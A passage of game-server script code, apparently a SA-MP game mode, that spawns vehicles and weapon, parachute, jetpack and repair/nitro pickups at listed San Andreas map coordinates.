	CreateVehicleEx(495,271.9809,1338.4265,10.5859,360.2514,-1,-1,respawntime,0,0); // [Sandking] Jeeps
	CreateVehicleEx(495,276.9808,1338.4484,10.5859,360.2514,-1,-1,respawntime,0,0); // [Sandking] Jeeps
	CreateVehicleEx(495,281.9808,1338.4704,10.5859,360.2514,-1,-1,respawntime,0,0); // [Sandking] Jeeps
	CreateVehicleEx(470,264.3651,1345.3337,10.5202,0.3872,-1,-1,respawntime,0,0); // [Patriot] Jeeps
	CreateVehicleEx(470,269.3650,1345.3675,10.5202,0.3872,-1,-1,respawntime,0,0); // [Patriot] Jeeps
	CreateVehicleEx(470,274.3649,1345.4013,10.5202,0.3872,-1,-1,respawntime,0,0); // [Patriot] Jeeps
	CreateVehicleEx(470,279.3648,1345.4361,10.5814,0.3872,-1,-1,respawntime,0,0); // [Patriot] Jeeps
	CreateVehicleEx(470,284.3646,1345.4699,10.5814,0.3872,-1,-1,respawntime,0,0); // [Patriot] Jeeps
	CreateVehicleEx(468,262.6845,1350.1130,10.2330,1.3270,-1,-1,respawntime,0,0); // [Sanchez] Jeeps
	CreateVehicleEx(468,267.6831,1350.2288,10.2330,1.3270,-1,-1,respawntime,0,0); // [Sanchez] Jeeps
	CreateVehicleEx(468,272.6818,1350.3447,10.2330,1.3270,-1,-1,respawntime,0,0); // [Sanchez] Jeeps
	CreateVehicleEx(468,277.6805,1350.4608,10.2622,1.3270,-1,-1,respawntime,0,0); // [Sanchez] Jeeps
	CreateVehicleEx(468,282.6792,1350.5766,10.2622,1.3270,-1,-1,respawntime,0,0); // [Sanchez] Jeeps
	CreateVehicleEx(471,263.3897,1353.4499,10.0638,2.5805,-1,-1,respawntime,0,0); // [Quad] Jeeps
	CreateVehicleEx(471,268.3846,1353.6750,10.0638,2.5805,-1,-1,respawntime,0,0); // [Quad] Jeeps
	CreateVehicleEx(471,273.3796,1353.9001,10.0638,2.5805,-1,-1,respawntime,0,0); // [Quad] Jeeps
	CreateVehicleEx(471,278.3746,1354.1212,10.1119,2.5805,-1,-1,respawntime,0,0); // [Quad] Jeeps
	CreateVehicleEx(471,283.3696,1354.3463,10.1119,2.5805,-1,-1,respawntime,0,0); // [Quad] Jeeps
	CreateVehicleEx(568,286.8400,1369.7961,10.3975,93.4480,-1,-1,respawntime,0,0); // [Bandito] Jeeps
	CreateVehicleEx(568,286.5393,1374.7871,10.3975,93.4480,-1,-1,respawntime,0,0); // [Bandito] Jeeps
	CreateVehicleEx(568,286.2386,1379.7780,10.3975,93.4480,-1,-1,respawntime,0,0); // [Bandito] Jeeps
	CreateVehicleEx(568,285.9334,1384.7690,10.4528,93.4480,-1,-1,respawntime,0,0); // [Bandito] Jeeps
	CreateVehicleEx(568,285.6326,1389.7600,10.4528,93.4480,-1,-1,respawntime,0,0); // [Bandito] Jeeps
	CreateVehicleEx(522,-2125.5400,-879.0682,31.5945,268.2937,-1,-1,respawntime,0,0); // [NRG-500] SanFierro
	CreateVehicleEx(522,-2125.3605,-895.2011,31.5877,267.5938,-1,-1,respawntime,0,0); // [NRG-500] SanFierro
	CreateVehicleEx(522,-2124.7812,-928.9887,31.5876,270.0717,-1,-1,respawntime,0,0); // [NRG-500] SanFierro
	CreateVehicleEx(406,282.7146,1455.3851,12.1194,90.6026,-1,-1,respawntime,0,0); // [Dumper] Jeeps
	CreateVehicleEx(406,282.5298,1464.4162,12.1073,90.4856,-1,-1,respawntime,0,0); // [Dumper] Jeeps
	CreateVehicleEx(406,282.4461,1473.6895,12.1221,92.9769,-1,-1,respawntime,0,0); // [Dumper] Jeeps
	CreateVehicleEx(486,272.7745,1480.8071,10.8142,173.9559,-1,-1,respawntime,0,0); // [Dozer] Jeeps
	CreateVehicleEx(486,260.5860,1480.8856,10.8449,176.4776,-1,-1,respawntime,0,0); // [Dozer] Jeeps
	CreateVehicleEx(486,266.8042,1480.8824,10.8372,177.7180,-1,-1,respawntime,0,0); // [Dozer] Jeeps
	CreateVehicleEx(572,286.6014,1443.1278,10.1803,90.2417,-1,-1,respawntime,0,0); // [Mower] Jeeps
	CreateVehicleEx(572,286.6592,1440.5554,10.1814,89.5603,-1,-1,respawntime,0,0); // [Mower] Jeeps
	CreateVehicleEx(572,286.6698,1437.8372,10.1687,89.6685,-1,-1,respawntime,0,0); // [Mower] Jeeps
	CreateVehicleEx(424,285.7352,1431.1431,10.3648,89.6763,-1,-1,respawntime,0,0); // [BF Injection] Jeeps
	CreateVehicleEx(424,285.7545,1434.9245,10.3669,89.9649,-1,-1,respawntime,0,0); // [BF Injection] Jeeps
	CreateVehicleEx(531,285.3730,1427.3684,10.5521,90.4637,-1,-1,respawntime,0,0); // [Tractor] Jeeps
	CreateVehicleEx(531,285.4234,1423.8792,10.5510,90.9328,-1,-1,respawntime,0,0); // [Tractor] Jeeps
	CreateVehicleEx(543,290.1587,1398.0780,10.2874,183.0878,-1,-1,respawntime,0,0); // [Sadler] Jeeps
	CreateVehicleEx(504,258.2460,1413.4273,10.3031,0.2532,-1,-1,respawntime,0,0); // [Bloodring Banger] Jeeps
	CreateVehicleEx(504,258.0993,1428.2601,10.3784,179.1255,-1,-1,respawntime,0,0); // [Bloodring Banger] Jeeps
	CreateVehicleEx(445,2534.9257,2014.6484,10.6952,90.7747,-1,-1,respawntime,0,0); // [Admiral] Park7
	CreateVehicleEx(426,1505.6705,2258.5156,10.5655,0.0004,-1,-1,respawntime,0,0); // [Premier] Park8
	CreateVehicleEx(405,1526.0151,2280.6232,10.6956,180.0773,-1,-1,respawntime,0,0); // [Sentinel] Park8
	CreateVehicleEx(461,1492.1127,2290.6354,10.4002,179.0846,-1,-1,respawntime,0,0); // [PCJ-600] Park8
	CreateVehicleEx(400,1499.7808,2203.0908,10.9125,180.6649,-1,-1,respawntime,0,0); // [Landstalker] Park8
	CreateVehicleEx(508,1527.6851,2202.4963,11.1968,181.1498,-1,-1,respawntime,0,0); // [Journey] Park8
	CreateVehicleEx(422,1396.4334,2280.0249,10.7523,89.2888,-1,-1,respawntime,0,0); // [Bobcat] Park8
	CreateVehicleEx(479,1368.4467,2235.8837,10.6162,89.1585,-1,-1,respawntime,0,0); // [Regina] Park8
	CreateVehicleEx(489,1329.3156,2239.2102,10.9646,271.2741,-1,-1,respawntime,0,0); // [Rancher] Park8
	CreateVehicleEx(404,1340.2327,2242.6862,10.5518,90.3858,-1,-1,respawntime,0,0); // [Pereniel] Park8
	CreateVehicleEx(481,1357.9626,2262.7539,10.3348,266.6216,-1,-1,respawntime,0,0); // [BMX] Park8
	CreateVehicleEx(551,1397.0968,2283.4606,10.5905,87.9278,-1,-1,respawntime,0,0); // [Merit] Park8
	CreateVehicleEx(445,1539.3804,2258.1552,10.6952,180.6807,-1,-1,respawntime,0,0); // [Admiral] Park8
	CreateVehicleEx(561,1539.3021,2291.0993,10.6344,0.3549,-1,-1,respawntime,0,0); // [Stratum] Park8
	CreateVehicleEx(458,1358.3371,2276.5358,10.6992,269.3436,-1,-1,respawntime,0,0); // [Solair] Park8
	CreateVehicleEx(466,1368.3939,2252.9150,10.4536,89.6970,-1,-1,respawntime,0,0); // [Glendale] Park8
	CreateVehicleEx(429,1515.7858,1918.2224,10.4999,0.7753,-1,-1,respawntime,0,0); // [Banshee] Park9
	CreateVehicleEx(429,1630.6627,1956.4309,10.4999,359.1302,-1,-1,respawntime,0,0); // [Banshee] Park9
	CreateVehicleEx(603,1634.5162,1956.3294,10.6590,0.3846,-1,-1,respawntime,0,0); // [Phoenix] Park9
	CreateVehicleEx(560,1587.6483,1918.3150,10.5166,1.7764,-1,-1,respawntime,0,0); // [Sultan] Park9
	CreateVehicleEx(463,1654.2014,1917.4197,10.3589,0.2832,-1,-1,respawntime,0,0); // [Freeway] Park9
	CreateVehicleEx(434,1650.9508,1918.0742,10.7793,357.2810,-1,-1,respawntime,0,0); // [Hotknife] Park9
	CreateVehicleEx(416,1614.9329,1822.1910,10.9926,91.6635,-1,-1,respawntime,0,0); // [Ambulance] LVHospital
	CreateVehicleEx(416,1611.8107,1848.9871,10.9690,181.8402,-1,-1,respawntime,0,0); // [Ambulance] LVHospital
	CreateVehicleEx(416,1600.8760,1822.1164,10.9693,90.3754,-1,-1,respawntime,0,0); // [Ambulance] LVHospital
	CreateVehicleEx(416,1596.7274,1848.9154,10.9698,179.6824,-1,-1,respawntime,0,0); // [Ambulance] LVHospital
	CreateVehicleEx(487,1607.3334,1768.1121,37.4850,359.8828,-1,-1,respawntime,0,0); // [Maverick] LVHospital
	CreateVehicleEx(586,1732.2401,1912.7274,10.3404,267.5831,-1,-1,respawntime,0,0); // [Wayfarer] Park10
	CreateVehicleEx(462,1740.1821,1892.3811,10.4202,94.0102,-1,-1,respawntime,0,0); // [Faggio] Park10
	CreateVehicleEx(451,1742.5096,1895.8300,10.5276,90.2902,-1,-1,respawntime,0,0); // [Turismo] Park10
	CreateVehicleEx(404,1731.7543,1965.4892,10.5533,269.4165,-1,-1,respawntime,0,0); // [Pereniel] Park10
	CreateVehicleEx(478,757.3328,1979.8758,5.3249,85.5145,-1,-1,respawntime,0,0); // [Walton] SandPark1
	CreateVehicleEx(508,753.8120,1952.0093,5.7109,257.2977,-1,-1,respawntime,0,0); // [Journey] SandPark1
	CreateVehicleEx(463,780.4119,1860.0445,4.3213,269.6629,-1,-1,respawntime,0,0); // [Freeway] Park11
	CreateVehicleEx(463,780.4678,1864.4266,4.3302,273.8947,-1,-1,respawntime,0,0); // [Freeway] Park11
	CreateVehicleEx(573,165.9113,-1870.1450,3.6613,271.0521,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.9753,-1865.7430,3.7766,267.2350,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.8233,-1855.5649,4.0909,272.4438,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.7782,-1849.6241,4.2341,277.3918,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.5935,-1845.8009,4.3855,273.1616,0,0,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,164.9068,-1842.2814,4.5269,271.5270,86,5,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.0291,-1838.4843,4.5712,271.9459,6,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(573,165.5686,-1834.6073,4.5505,269.7067,16,8,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,209.4991,-1883.3282,1.3285,188.6973,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,206.8926,-1883.4789,1.3238,180.9479,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,212.7220,-1883.1818,1.3312,181.0762,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,215.7162,-1883.4298,1.3101,178.8985,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,218.7290,-1883.7869,1.2629,171.4435,0,0,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,221.6612,-1884.2727,1.2055,178.1907,86,5,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,224.3874,-1884.3024,1.1686,354.3509,6,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(567,227.3875,-1884.4889,1.1217,180.7645,16,8,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(541,251.6183,-1884.3885,0.7953,172.0716,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(541,248.5236,-1884.1927,0.8240,173.0781,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(541,245.4272,-1883.6072,0.8857,179.0392,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(541,242.1934,-1883.3754,0.9167,178.1413,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(541,238.8044,-1883.6112,0.9132,179.9917,0,0,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(539,201.2079,-1868.6820,2.1462,97.4586,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(539,245.7937,-1868.7296,1.7681,86.9396,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(539,289.2579,-1869.0787,1.9722,92.2666,0,0,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(539,338.0903,-1869.4633,2.1741,268.4736,86,5,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(522,216.7967,-1925.5710,-4.5267,188.9979,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(522,215.1438,-1925.4473,-4.5217,189.3044,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(522,214.2591,-1925.2888,-4.5116,182.8381,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(522,212.4340,-1925.7441,-4.5271,171.7093,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(522,210.9400,-1925.1517,-4.5156,165.6302,7,79,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(513,196.8768,-2086.2637,-27.5981,179.6558,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(513,185.3716,-2086.2764,-27.7169,180.5223,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(513,175.9746,-2085.6584,-27.7380,179.8763,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(513,166.2140,-2085.7932,-27.7025,179.6502,0,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(511,211.5063,-2088.2124,-26.8840,172.8232,0,0,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(487,236.0497,-2093.2739,-28.0888,179.8482,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(487,246.8183,-2093.2402,-28.0429,179.9993,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(487,257.8907,-2094.6633,-27.9585,179.9421,126,1,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(446,290.7897,-1908.3013,-0.5348,358.8961,3,6,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(446,283.3269,-1906.2926,-0.3511,0.0066,7,118,respawntime,0,0); // [Old Vehicles] Water
	CreateVehicleEx(448,2096.8454,-1819.6068,12.9817,90.3934,-1,-1,respawntime,0,0); // [Pizzaboy] Stores
	CreateVehicleEx(588,1198.3245,-887.0390,42.9108,278.4439,-1,-1,respawntime,0,0); // [Hotdog] Stores
	CreateVehicleEx(448,-1801.6582,951.7639,24.3344,181.1307,-1,-1,respawntime,0,0); // [Pizzaboy] Stores
	CreateVehicleEx(588,-2316.5722,-147.7835,35.2237,181.0583,-1,-1,respawntime,0,0); // [Hotdog] Stores
	CreateVehicleEx(415,2188.9191,1822.0498,10.5669,180.3858,-1,-1,respawntime,0,0); // [Cheetah] Park12
	CreateVehicleEx(402,2171.5756,1810.1107,10.6114,359.7738,-1,-1,respawntime,0,0); // [Buffalo] Park12
	CreateVehicleEx(434,2145.2692,1806.7685,10.7385,243.1639,-1,-1,respawntime,0,0); // [Hotknife] Park12
	CreateVehicleEx(477,2156.0783,1787.7708,10.6183,359.7860,-1,-1,respawntime,0,0); // [ZR-350] Park12
	CreateVehicleEx(480,2179.4873,1800.1702,10.6052,179.6710,-1,-1,respawntime,0,0); // [Comet] Park12
	CreateVehicleEx(500,2198.9204,1787.3951,10.9565,1.4684,-1,-1,respawntime,0,0); // [Mesa] Park12
	CreateVehicleEx(603,2241.7770,1787.3249,10.5781,1.4783,-1,-1,respawntime,0,0); // [Phoenix] Park12
	CreateVehicleEx(589,2188.7761,1855.9617,10.4783,0.1594,-1,-1,respawntime,0,0); // [Club] Park12
	CreateVehicleEx(467,2202.6313,1878.9578,10.5603,180.1266,-1,-1,respawntime,0,0); // [Oceanic] Park12
	CreateVehicleEx(461,2236.5285,1878.8750,10.4042,181.4569,-1,-1,respawntime,0,0); // [PCJ-600] Park12
	CreateVehicleEx(535,2284.9562,2042.4735,10.5843,90.5695,-1,-1,respawntime,0,0); // [Slamvan] Park13
	CreateVehicleEx(555,2296.3811,2046.3785,10.5046,270.2690,-1,-1,respawntime,0,0); // [Windsor] Park13
	CreateVehicleEx(486,2425.4143,1893.4879,6.2356,2.6575,-1,-1,respawntime,0,0); // [Dozer] LVQuarry
	CreateVehicleEx(524,2423.4821,1955.5826,7.0130,180.0000,-1,-1,respawntime,0,0); // [Cement Truck] LVQuarry
	CreateVehicleEx(524,2429.9497,1955.5054,6.9443,180.1661,-1,-1,respawntime,0,0); // [Cement Truck] LVQuarry
	CreateVehicleEx(463,2599.3562,2085.4653,10.3233,358.0423,-1,-1,respawntime,0,0); // [Freeway] Park14
	CreateVehicleEx(419,2623.1220,2086.9916,10.6461,359.5318,-1,-1,respawntime,0,0); // [Esperanto] Park14
	CreateVehicleEx(422,2620.1677,2086.5673,10.8136,0.3926,-1,-1,respawntime,0,0); // [Bobcat] Park14
	CreateVehicleEx(559,2311.9262,2754.3901,10.4766,90.2794,-1,-1,respawntime,0,0); // [Jester] Park14
	CreateVehicleEx(589,2295.5761,2770.5747,10.4783,269.2376,-1,-1,respawntime,0,0); // [Club] Park14
	CreateVehicleEx(561,2346.0363,2770.4997,10.6339,270.3317,-1,-1,respawntime,0,0); // [Stratum] Park14
	CreateVehicleEx(546,2346.9860,2747.6809,10.5447,269.1047,-1,-1,respawntime,0,0); // [Intruder] Park14
	CreateVehicleEx(489,2261.8398,2780.1118,10.9641,89.8262,-1,-1,respawntime,0,0); // [Rancher] Park14
	CreateVehicleEx(551,2167.0021,2747.5734,10.6208,90.0360,-1,-1,respawntime,0,0); // [Merit] Park15
	CreateVehicleEx(466,2167.1665,2727.4404,10.5963,89.8377,-1,-1,respawntime,0,0); // [Glendale] Park15
	CreateVehicleEx(429,2103.9042,2089.1352,10.4999,90.0070,-1,-1,respawntime,0,0); // [Banshee] Park16
	CreateVehicleEx(526,2103.9511,2098.8503,10.5869,89.8535,-1,-1,respawntime,0,0); // [Fortune] Park16
	CreateVehicleEx(551,2103.4206,2062.9296,10.6208,90.0271,-1,-1,respawntime,0,0); // [Merit] Park16
	CreateVehicleEx(445,1424.7740,972.8668,10.0122,0.8491,-1,-1,respawntime,0,0); // [Admiral] Park17
	CreateVehicleEx(466,1427.8507,1029.8500,9.8178,89.8554,-1,-1,respawntime,0,0); // [Glendale] Park17
	CreateVehicleEx(422,1461.9108,972.2663,10.0780,1.0982,-1,-1,respawntime,0,0); // [Bobcat] Park17
	CreateVehicleEx(555,1530.2322,2827.2612,10.4808,89.3183,-1,-1,respawntime,0,0); // [Windsor] LVGolfClub
	CreateVehicleEx(555,1479.7169,2843.5488,10.5015,178.7218,-1,-1,respawntime,0,0); // [Windsor] LVGolfClub
	CreateVehicleEx(554,1504.8502,2878.5844,10.9264,179.4221,-1,-1,respawntime,0,0); // [Yosemite] LVGolfClub
	CreateVehicleEx(551,1529.1369,2849.8452,10.6153,89.0473,-1,-1,respawntime,0,0); // [Merit] LVGolfClub
	CreateVehicleEx(547,1460.4669,2842.9184,10.5346,180.8127,-1,-1,respawntime,0,0); // [Primo] LVGolfClub
	CreateVehicleEx(540,1460.2141,2878.8945,10.6819,179.6436,-1,-1,respawntime,0,0); // [Vincent] LVGolfClub
	CreateVehicleEx(547,1422.1298,2851.4045,10.5544,270.6975,-1,-1,respawntime,0,0); // [Primo] LVGolfClub
	CreateVehicleEx(461,1422.3046,2864.6486,10.3995,269.5012,-1,-1,respawntime,0,0); // [PCJ-600] LVGolfClub
	CreateVehicleEx(457,1295.9494,2845.9599,10.4416,146.3632,-1,-1,respawntime,0,0); // [Caddy] LVGolfClub
	CreateVehicleEx(457,1138.4272,2805.1564,10.5955,127.8878,-1,-1,respawntime,0,0); // [Caddy] LVGolfClub
	CreateVehicleEx(457,1224.5783,2784.3488,10.4405,94.7522,-1,-1,respawntime,0,0); // [Caddy] LVGolfClub
	CreateVehicleEx(457,1251.7436,2760.7851,10.4439,130.3688,-1,-1,respawntime,0,0); // [Caddy] LVGolfClub
	CreateVehicleEx(457,1354.5922,2779.8190,10.4469,141.3789,-1,-1,respawntime,0,0); // [Caddy] LVGolfClub
	CreateVehicleEx(470,286.5117,1990.8287,17.6406,328.6362,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(432,215.1766,1862.4846,13.1495,268.2456,-1,-1,respawntime,0,0); // [Rhino] Army
	CreateVehicleEx(520,309.4299,1965.1323,17.6406,262.0620,-1,-1,respawntime,0,0); // [Hydra] Army
	CreateVehicleEx(425,307.8214,1946.9870,17.6406,286.8156,-1,-1,respawntime,0,0); // [Hunter] Army
	CreateVehicleEx(470,332.6751,1961.0628,17.6406,372.6697,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(470,340.0249,1948.7033,18.0255,326.3662,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(470,340.1256,1963.8109,17.6766,82.2303,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(470,350.0689,1975.4259,18.3182,409.6434,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(470,136.2600,1889.8587,18.3080,92.1592,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(470,209.5437,1839.4813,17.6326,181.7259,-1,-1,respawntime,0,0); // [Patriot] Army
	CreateVehicleEx(548,200.7540,1887.9652,19.2403,184.2704,-1,-1,respawntime,0,0); // [Cargobob] Army
	CreateVehicleEx(522,-111.3282,-7.6147,2.7084,70.5979,-1,-1,respawntime,0,0); // [NRG-500] Center
	CreateVehicleEx(522,-109.6672,-2.8986,2.7084,70.5979,-1,-1,respawntime,0,0); // [NRG-500] Center
	CreateVehicleEx(522,-108.0062,1.8173,2.7084,70.5979,-1,-1,respawntime,0,0); // [NRG-500] Center
	CreateVehicleEx(522,-106.3483,6.5345,2.6038,70.5979,-1,-1,respawntime,0,0); // [NRG-500] Center
	CreateVehicleEx(522,-104.6873,11.2505,2.6038,70.5979,-1,-1,respawntime,0,0); // [NRG-500] Center
	CreateVehicleEx(461,-107.5575,-16.5170,2.6968,341.6252,-1,-1,respawntime,0,0); // [PCJ-600] Center
	CreateVehicleEx(461,-102.8122,-18.0925,2.6968,341.6252,-1,-1,respawntime,0,0); // [PCJ-600] Center
	CreateVehicleEx(461,-98.0668,-19.6679,2.6968,341.6252,-1,-1,respawntime,0,0); // [PCJ-600] Center
	CreateVehicleEx(522,1784.0828,-2413.9091,22.6208,271.0679,-1,-1,respawntime,0,32); // [NRG-500] APS
	CreateVehicleEx(522,1772.3977,-2398.1997,22.6154,343.4533,-1,-1,respawntime,0,32); // [NRG-500] APS
	CreateVehicleEx(522,1780.5665,-2423.6125,22.6260,231.5992,-1,-1,respawntime,0,32); // [NRG-500] APS
	CreateVehicleEx(521,1762.5651,-2429.3552,22.6248,156.8095,-1,-1,respawntime,0,32); // [FCR-900] APS
	CreateVehicleEx(521,1772.5694,-2430.0507,22.6258,203.1772,-1,-1,respawntime,0,32); // [FCR-900] APS
	CreateVehicleEx(521,1754.0289,-2423.5986,22.6196,125.3481,-1,-1,respawntime,0,32); // [FCR-900] APS
	CreateVehicleEx(461,1762.6330,-2398.0043,22.6409,27.5210,-1,-1,respawntime,0,32); // [PCJ-600] APS
	CreateVehicleEx(461,1751.2452,-2413.7150,22.6348,90.8887,-1,-1,respawntime,0,32); // [PCJ-600] APS
	CreateVehicleEx(461,1753.8038,-2404.0178,22.6376,54.4138,-1,-1,respawntime,0,32); // [PCJ-600] APS
	CreateVehicleEx(522,1780.9774,-2404.2468,22.6209,308.0493,-1,-1,respawntime,0,32); // [NRG-500] APS
	// Gamemode Pickups
	dbg(11,"6.1");
	CreatePickupEx(1242,2, 807.7548,850.9089,10.0574);
 	CreatePickupEx(356,2,2507.8462,-1639.8785,13.6307);
	CreatePickupEx(353,2,2070.8372,-1571.2181,13.4221);
	CreatePickupEx(350,2,1756.8473,-1932.0759,13.4235);
	CreatePickupEx(1242,2,2011.2939,-1354.6217,23.9849);
	CreatePickupEx(1240,2,1503.7126,-1221.4723,18.9337);
	CreatePickupEx(346,2,369.8719,-2050.7329,8.0156);
	CreatePickupEx(348,2,1132.6256,-1346.1665,13.9910);
	CreatePickupEx(356,2,1342.0432,-1622.9261,17.7341);
	CreatePickupEx(372,2,2050.2852,-1158.4056,23.4506);
	CreatePickupEx(351,2,1424.2021,-1082.7992,17.5555);
	CreatePickupEx(358,2,2748.9766,-1231.3031,62.4922);
	CreatePickupEx(352,2,-2136.1860,265.5738,35.3312);
	CreatePickupEx(351,2,-1923.5642,454.0430,35.1719);
	CreatePickupEx(356,2,-1545.4366,700.3668,45.0592);
	CreatePickupEx(372,2,-2118.3772,927.7594,86.0791);
	CreatePickupEx(358,2,-2126.7971,1111.6456,76.7929);
	CreatePickupEx(350,2,-1753.7230,886.0012,295.8750);
	CreatePickupEx(351,2,-1701.1989,689.0586,24.8906);
	CreatePickupEx(372,2,-1647.8208,1428.4241,7.8828);
	CreatePickupEx(356,2,-2611.1389,286.6106,4.4409);
	CreatePickupEx(351,2,-2695.8782,28.6267,4.7326);
	CreatePickupEx(358,2,-2521.4038,-623.2798,132.7681);
	CreatePickupEx(357,2,-2503.2073,2369.8042,4.9802);
	CreatePickupEx(353,2,2016.6135,903.9200,10.8203);
	CreatePickupEx(351,2,2323.5840,1283.1169,97.5218);
	CreatePickupEx(353,2,2264.6638,2045.9447,10.8203);
	CreatePickupEx(1242,2,2105.9880,1960.6171,10.1951);
	CreatePickupEx(1240,2,2002.5812,1523.3411,17.0682);
	CreatePickupEx(358,2,1980.4905,1903.3833,122.0156);
	CreatePickupEx(357,2,2316.6152,2353.0710,17.7403);
	CreatePickupEx(350,2,2026.6127,1695.5753,8.0978);
	CreatePickupEx(351,2,2516.8982,1568.0815,11.5560);
	CreatePickupEx(350,2,2023.2216,1077.5992,11.0522);
	CreatePickupEx(358,2,216.3127,2587.0310,89.8936);
	CreatePickupEx(1242,2,2125.2041,956.9120,10.8203);
	CreatePickupEx(371,2,-2080.4514,287.0634,105.7115); // para
	CreatePickupEx(371,2,2399.0540,1914.0162,76.3745); // para
	CreatePickupEx(371,2,-1753.6674,884.9456,295.8750); // para
	CreatePickupEx(371,2,-2697.6514,1594.9148,217.2739); // para
	CreatePickupEx(370,2,1922.1530,-584.2317,28.3991,0,world_srace); // srace jetp
	CreatePickupEx(370,2,1924.3043,-585.4131,28.3793,0,world_srace); // srace jetp
	CreatePickupEx(370,2,1927.0618,-586.6442,28.2474,0,world_srace); // srace jetp
	CreatePickupEx(370,2,1929.4943,-587.8729,28.1848,0,world_srace); // srace jetp
	CreatePickupEx(370,2,1932.0630,-589.2565,28.1510,0,world_srace); // srace jetp
	CreatePickupEx(338,2,510.0620,-83.3582,998.9609); // bar-snoker
	CreatePickupEx(338,2,506.3500,-83.2475,998.9609); // bar-snoker
	CreatePickupEx(336,2,490.8896,-80.8076,998.7578); // bar-bat
	CreatePickupEx(350,2,-2589.9229,1162.4924,58.4738); // Race 2
	CreatePickupEx(358,2,-2611.1533,1152.8351,71.4781); // Race 2
	CreatePickupEx(358,2,-2626.6067,1130.9934,71.4781); // Race 2
	CreatePickupEx(358,2,-1403.6039,-288.5083,26.4056); // AP 2
	CreatePickupEx(356,2,-1384.0972,-268.8310,28.5561); // AP 2
	CreateVehiclePickup(2287.4299,923.4408,11.0699,world_normal,vp_repair); // repair
	CreateVehiclePickup(2408.8040,1020.5746,10.8203,world_normal,vp_nitro); // nitro
	CreateVehiclePickup(2628.1438,1313.6851,11.0762,world_normal,vp_repair); // repair
	CreateVehiclePickup(150.1681,2549.5639,30.2,world_normal,vp_replace,464); // replaceto_rcplane AS (V)
	CreateVehiclePickup(-134.5287,2498.5510,78.7,world_normal,vp_replace,464); // replaceto_rcplane AS (V)
	CreateVehiclePickup(240.2763,2502.4123,24.9,world_normal,vp_repair); // repair AS (V)
	CreateVehiclePickup(-12.7328,2492.9248,16.9556,world_normal,vp_turbo); // turbo AS (V)
	CreateVehiclePickup(287.7761,2551.2888,45.1575,world_normal,vp_repair); // repair AS (V)
	CreateVehiclePickup(843.7187,871.1860,13.1554,world_normal,vp_repair); // repair
	CreateVehiclePickup(2327.1455,1518.1573,43.2744,world_normal,vp_turbo); // turbo
	CreateVehiclePickup(843.7187,871.1860,13.1554,world_normal,vp_repair); // repair
	CreateVehiclePickup(2327.1455,1518.1573,43.2744,world_normal,vp_turbo); // turbo
	CreateVehiclePickup(1552.3121,-1390.9646,164.2228,world_challenges,vp_repair); // repair_extremeworld
	CreateVehiclePickup(1735.6538,-1364.9504,214.3806,world_normal,vp_repair); // repair
	CreateVehiclePickup(1807.9564,-1302.7164,152.8933,world_normal,vp_repair); // repair
	CreateVehiclePickup(-1447.1282,-117.4582,89.0471,world_stunts,vp_repair); // repair_STUNTS
	CreateVehiclePickup(-906.3993,-244.9540,147.6783,world_stunts,vp_nitro); // nitro_STUNTS
	CreateVehiclePickup(1582.2036,-2493.2710,16.5010,world_normal,vp_nitro); // aprace_nitro
	CreateVehiclePickup(1826.7880,-2486.9116,20.9357,world_normal,vp_repair); // aprace_repair
	CreateVehiclePickup(2064.5193,-2505.4280,13.1123,world_normal,vp_repair); // aprace_repair
	CreateVehiclePickup(2021.2988,-2606.6885,13.1125,world_normal,vp_repair); // aprace_repair
	CreateVehiclePickup(1428.7434,-2585.5835,13.1106,world_normal,vp_turbo); // aprace_turbo
	CreateVehiclePickup(1485.2173,1640.2595,19.5349,world_challenges,vp_repair); // challenge_repair
